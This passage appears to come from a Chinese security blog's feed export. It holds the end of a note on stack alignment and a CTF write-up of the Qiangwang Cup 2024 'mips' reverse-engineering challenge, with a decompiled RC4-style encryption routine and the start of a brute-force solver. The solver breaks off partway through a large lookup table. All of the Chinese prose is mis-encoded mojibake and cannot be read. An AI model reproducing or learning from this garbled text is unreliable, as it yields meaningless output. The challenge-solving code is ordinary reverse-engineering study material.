<code>calloc</code>æˆ–<code>realloc</code>ï¼‰ç”Ÿæˆçš„å—çš„èµ·å§‹åœ°å€éƒ½å¿…é¡»æ˜¯16çš„å€æ•°ã€‚</li><li>å¤§å¤šæ•°å‡½æ•°çš„æ ˆå¸§çš„è¾¹ç•Œéƒ½å¿…é¡»æ˜¯16å­—èŠ‚çš„å€æ•°ã€‚</li></ul><p>å¦‚ä¸Šï¼Œåœ¨è¿è¡Œæ—¶æ ˆä¸­ï¼Œä¸ä»…ä¼ é€’çš„å‚æ•°å’Œå±€éƒ¨å˜é‡è¦æ»¡è¶³å­—èŠ‚å¯¹é½ï¼Œæˆ‘ä»¬çš„æ ˆæŒ‡é’ˆï¼ˆ<code>rsp</code>ï¼‰ä¹Ÿå¿…é¡»æ˜¯16çš„å€æ•°ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> pwn </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯2024å¤ç°</title>
      <link href="/posts/a234fc27.html"/>
      <url>/posts/a234fc27.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªé¢˜å¥½éš¾QAQï¼Œæ•´ä¸ªæ¯”èµ›éƒ½æ˜¯è¢«æ‰“ï¼Œæˆ‘è¦è£‚å¼€äº†</p><h2 id="mips">mips</h2><p>çº¯å¤ç°ï¼Œè¿™é‡Œå…ˆè®²ä¸€ä¸‹æˆ‘çš„ä¹‹å‰çš„åšé¢˜æµç¨‹</p><p>åœ¨ä»£ç ä¸­ï¼Œæ˜¯å¼€è¾Ÿäº†ä¸€å—åŒºåŸŸï¼Œç„¶åæ”¾ç½®åŠ å¯†åçš„ä»£ç ï¼Œç„¶åå†è§£å¯†ï¼Œ<br>å¯ä»¥ç›´æ¥dumpç„¶åä¿®æ”¹ï¼Œç¡®å®å¯ä»¥å¾—åˆ°æ­£ç¡®çš„è¾“å‡º</p><p>ä½†æ˜¯è¾“å‡ºæ˜¯å‡flagï¼Œæ‰€ä»¥å®ƒè‚¯å®šä¿®æ”¹äº†åŠ å¯†çš„å†…å®¹ï¼Œæˆ‘å°è¯•è°ƒè¯•-gä½†æ˜¯emuä¸å…è®¸è°ƒè¯•ï¼Œpatchäº†ä¹Ÿæ²¡ç”¨ï¼Œç„¶åæˆ‘å°è¯•ä½¿ç”¨äº†åŸæœ¬çš„qemuï¼Œå€’æ˜¯å¯ä»¥è°ƒè¯•äº†ï¼Œä½†æ˜¯åªèƒ½æ£€æµ‹å‡flagã€‚è‡³æ­¤ï¼Œå¤§æ¦‚èƒ½åˆ¤æ–­çœŸflagåœ¨ä¿®æ”¹è¿‡çš„emuä¸­ã€‚ç„¶åæˆ‘å°è¯•äº†bindiffï¼Œä½†æ˜¯ç”±äºç‰ˆæœ¬ä¸å¯¹ï¼Œæœ‰ä¸€å †ä¸ä¸€æ ·çš„ä¸å¥½æ‰¾ã€‚</p><p>ç„¶åå°±çœ‹wpäº†ï¼Œç½‘ä¸Šä¸€ä½ä½¬çš„åšæ³•ï¼š</p><p><a href="https://www.ctfiot.com/213409.html">å¼ºç½‘æ¯ 2024 åˆèµ› Writeup | CTFå¯¼èˆª</a></p><p>mmapå‡½æ•°åˆ†é…çš„å†…å­˜åœ°å€æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦ä¿®æ”¹æµç¨‹ï¼Œé‚£å¿…ç„¶éœ€è¦ç›´æ¥å¯»å€ï¼Œç›´æ¥æœç´¢ç«‹å³æ•°0x23000å¯ä»¥æ‰¾åˆ°å”¯ä¸€ä¸€ä¸ªè°ƒç”¨å®ƒçš„å‡½æ•°</p><p>ç»“æœè¿™ä¸ªè¿˜æ²¡æœ‰è°ƒç”¨</p><p>æœ‰èŠ±ï¼Œå»äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_33D48E</span><span class="params">(_BYTE *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+15h] [rbp-17Bh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+24h] [rbp-16Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-168h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-164h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-15Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-154h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *key1; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">  _BYTE *out; <span class="comment">// [rsp+48h] [rbp-148h]</span></span><br><span class="line">  _BYTE S[<span class="number">256</span>]; <span class="comment">// [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+188h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(S, <span class="number">0</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    S[i] = i;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  key1 = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (<span class="type">unsigned</span> __int8)S[v5];</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)(key1++)[(<span class="type">int</span>)(<span class="number">2</span> * (v5 / <span class="number">6</span> - (((<span class="number">2863311531u</span> * (<span class="type">unsigned</span> __int64)v5) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFC</span>)))];</span><br><span class="line">    v4 += v9 + v10;</span><br><span class="line">    v1 = v5++;</span><br><span class="line">    S[v1] = S[(<span class="type">unsigned</span> __int8)v4];</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v4] = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  out = (_BYTE *)mallocLike(<span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">22</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int8)S[(<span class="type">unsigned</span> __int8)++v6];</span><br><span class="line">    v7 += v11;</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v6] = S[(<span class="type">unsigned</span> __int8)v7];</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v7] = v11;</span><br><span class="line">    v2 = ((((<span class="type">unsigned</span> __int8)(input[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">6</span>) ^ <span class="number">0xC0</span> | ((<span class="type">unsigned</span> __int8)((input[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x3B</span>) ^ <span class="number">0xBE</span>;</span><br><span class="line">    out[j] = S[(<span class="type">unsigned</span> __int8)(S[(<span class="type">unsigned</span> __int8)v6] + v11)] ^ key2[j &amp; <span class="number">3</span>] ^ (((<span class="type">unsigned</span> __int8)(((<span class="number">16</span> * (((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>) &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * (((<span class="number">16</span> * (((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != __readfsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    sub_616930();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯åŠ å¯†å‡½æ•°</p><p>ä¸Šé¢å¼‚æˆ–çš„åœ°æ–¹ç”¨çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä½†æ˜¯ä¸ä¼šè°ƒï¼Œæ‰¾äº¤å‰å¼•ç”¨å‘ç°æ¨¡äº†255ï¼Œé‚£å°±çˆ†ç ´</p><p>åƒè¿™ç§æŠ½è±¡çš„åç¼–è¯‘çš„ä»£ç å°±ç›´æ¥æŠ„å§QAQ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+15h] [rbp-17Bh]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [rsp+24h] [rbp-16Ch]</span></span><br><span class="line"><span class="type">int</span> l; <span class="comment">// [rsp+28h] [rbp-168h]</span></span><br><span class="line"><span class="comment">//int j; // [rsp+2Ch] [rbp-164h]</span></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-15Ch]</span></span><br><span class="line"><span class="type">int</span> m; <span class="comment">// [rsp+3Ch] [rbp-154h]</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* key1; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">BYTE out[<span class="number">24</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// [rsp+48h] [rbp-148h]</span></span><br><span class="line"><span class="comment">//BYTE S[256]; // [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">BYTE Sbak[<span class="number">256</span>];</span><br><span class="line">BYTE Sbak2[<span class="number">256</span>];</span><br><span class="line">__int16 v15; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+188h] [rbp-8h]</span></span><br><span class="line"><span class="type">char</span>* key = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line"><span class="type">int</span> i_1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">key = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)S[i_1];</span><br><span class="line">BYTE v11 = (<span class="type">unsigned</span> __int8)(key++)[(<span class="type">int</span>)(<span class="number">2</span> * (i_1 / <span class="number">6</span> - (((<span class="number">0xAAAAAAAB</span> * (<span class="type">unsigned</span> __int64)i_1) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFC</span>)))];</span><br><span class="line">v5 += v10 + v11;</span><br><span class="line">v1 = i_1++;</span><br><span class="line">S[v1] = S[(<span class="type">unsigned</span> __int8)v5];</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)v5] = v10;</span><br><span class="line">&#125; <span class="keyword">while</span> (i_1 != <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> input[<span class="number">21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">256</span>][<span class="number">24</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;<span class="number">0xc4</span>, <span class="number">0xee</span>, <span class="number">0x3c</span>, <span class="number">0xbb</span>, <span class="number">0xe7</span>, <span class="number">0xfd</span>, <span class="number">0x67</span>, <span class="number">0x9d</span>, <span class="number">0xf8</span>, <span class="number">0x97</span>, <span class="number">0x68</span>, <span class="number">0x1d</span>, <span class="number">0xdf</span>, <span class="number">0x7f</span>, <span class="number">0xc7</span>, <span class="number">0x80</span>, <span class="number">0x0b</span>, <span class="number">0xf9</span>, <span class="number">0x4b</span>, <span class="number">0xa0</span>, <span class="number">0x46</span>, <span class="number">0x91</span>&#125;,</span><br><span class="line">&#123; <span class="number">0xc5</span>, <span class="number">0xef</span>, <span class="number">0x3d</span>, <span class="number">0xba</span>, <span class="number">0xe6</span>, <span class="number">0xfc</span>, <span class="number">0x66</span>, <span class="number">0x9c</span>, <span class="number">0xf9</span>, <span class="number">0x96</span>, <span class="number">0x69</span>, <span class="number">0x1c</span>, <span class="number">0xde</span>, <span class="number">0x7e</span>, <span class="number">0xc6</span>, <span class="number">0x81</span>, <span class="number">0x0a</span>, <span class="number">0xf8</span>, <span class="number">0x4a</span>, <span class="number">0xa1</span>, <span class="number">0x47</span>, <span class="number">0x90</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc6</span>, <span class="number">0xec</span>, <span class="number">0x3e</span>, <span class="number">0xb9</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0x65</span>, <span class="number">0x9f</span>, <span class="number">0xfa</span>, <span class="number">0x95</span>, <span class="number">0x6a</span>, <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0x7d</span>, <span class="number">0xc5</span>, <span class="number">0x82</span>, <span class="number">0x09</span>, <span class="number">0xfb</span>, <span class="number">0x49</span>, <span class="number">0xa2</span>, <span class="number">0x44</span>, <span class="number">0x93</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc7</span>, <span class="number">0xed</span>, <span class="number">0x3f</span>, <span class="number">0xb8</span>, <span class="number">0xe4</span>, <span class="number">0xfe</span>, <span class="number">0x64</span>, <span class="number">0x9e</span>, <span class="number">0xfb</span>, <span class="number">0x94</span>, <span class="number">0x6b</span>, <span class="number">0x1e</span>, <span class="number">0xdc</span>, <span class="number">0x7c</span>, <span class="number">0xc4</span>, <span class="number">0x83</span>, <span class="number">0x08</span>, <span class="number">0xfa</span>, <span class="number">0x48</span>, <span class="number">0xa3</span>, <span class="number">0x45</span>, <span class="number">0x92</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc0</span>, <span class="number">0xea</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0xe3</span>, <span class="number">0xf9</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0xfc</span>, <span class="number">0x93</span>, <span class="number">0x6c</span>, <span class="number">0x19</span>, <span class="number">0xdb</span>, <span class="number">0x7b</span>, <span class="number">0xc3</span>, <span class="number">0x84</span>, <span class="number">0x0f</span>, <span class="number">0xfd</span>, <span class="number">0x4f</span>, <span class="number">0xa4</span>, <span class="number">0x42</span>, <span class="number">0x95</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x39</span>, <span class="number">0xbe</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x62</span>, <span class="number">0x98</span>, <span class="number">0xfd</span>, <span class="number">0x92</span>, <span class="number">0x6d</span>, <span class="number">0x18</span>, <span class="number">0xda</span>, <span class="number">0x7a</span>, <span class="number">0xc2</span>, <span class="number">0x85</span>, <span class="number">0x0e</span>, <span class="number">0xfc</span>, <span class="number">0x4e</span>, <span class="number">0xa5</span>, <span class="number">0x43</span>, <span class="number">0x94</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc2</span>, <span class="number">0xe8</span>, <span class="number">0x3a</span>, <span class="number">0xbd</span>, <span class="number">0xe1</span>, <span class="number">0xfb</span>, <span class="number">0x61</span>, <span class="number">0x9b</span>, <span class="number">0xfe</span>, <span class="number">0x91</span>, <span class="number">0x6e</span>, <span class="number">0x1b</span>, <span class="number">0xd9</span>, <span class="number">0x79</span>, <span class="number">0xc1</span>, <span class="number">0x86</span>, <span class="number">0x0d</span>, <span class="number">0xff</span>, <span class="number">0x4d</span>, <span class="number">0xa6</span>, <span class="number">0x40</span>, <span class="number">0x97</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc3</span>, <span class="number">0xe9</span>, <span class="number">0x3b</span>, <span class="number">0xbc</span>, <span class="number">0xe0</span>, <span class="number">0xfa</span>, <span class="number">0x60</span>, <span class="number">0x9a</span>, <span class="number">0xff</span>, <span class="number">0x90</span>, <span class="number">0x6f</span>, <span class="number">0x1a</span>, <span class="number">0xd8</span>, <span class="number">0x78</span>, <span class="number">0xc0</span>, <span class="number">0x87</span>, <span class="number">0x0c</span>, <span class="number">0xfe</span>, <span class="number">0x4c</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x96</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xcc</span>, <span class="number">0xe6</span>, <span class="number">0x34</span>, <span class="number">0xb3</span>, <span class="number">0xef</span>, <span class="number">0xf5</span>, <span class="number">0x6f</span>, <span class="number">0x95</span>, <span class="number">0xf0</span>, <span class="number">0x9f</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0xd7</span>, <span class="number">0x77</span>, <span class="number">0xcf</span>, <span class="number">0x88</span>, <span class="number">0x03</span>, <span class="number">0xf1</span>, <span class="number">0x43</span>, <span class="number">0xa8</span>, <span class="number">0x4e</span>, <span class="number">0x99</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xcd</span>, <span class="number">0xe7</span>, <span class="number">0x35</span>, <span class="number">0xb2</span>, <span class="number">0xee</span>, <span class="number">0xf4</span>, <span class="number">0x6e</span>, <span class="number">0x94</span>, <span class="number">0xf1</span>, <span class="number">0x9e</span>, <span class="number">0x61</span>, <span class="number">0x14</span>, <span class="number">0xd6</span>, <span class="number">0x76</span>, <span class="number">0xce</span>, <span class="number">0x89</span>, <span class="number">0x02</span>, <span class="number">0xf0</span>, <span class="number">0x42</span>, <span class="number">0xa9</span>, <span 